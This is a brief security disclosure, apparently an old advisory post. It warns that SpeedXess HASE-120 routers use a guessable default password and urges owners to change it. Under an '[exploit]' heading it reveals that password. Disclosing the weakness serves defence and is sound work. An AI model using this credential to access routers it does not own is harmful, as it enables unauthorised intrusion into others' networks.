password vulnerability

-=Content=- 

Too many routers are exposed to default password 
problem, so I write this for the security of router. This 
is not for attack but security. I came to know many 
company use SpeedXess HASE-120 router, but they 
don't seem to be aware of this problem, or don't care. 

I happened to connect SpeedXess HASE-120 router 
one day. SpeedXess Hase-120 may be one of most 
routers ISPs supply. I could guess the default 
password easily. But they don't seem to care 
because the router is not considered as important. If 
you use default password of SpeedXess Hase-120 
router, change it now. 

[exploit]: 
The default password is easy for you to guess. Look 
at the text logo! And guess! The password 
is "speedxess".
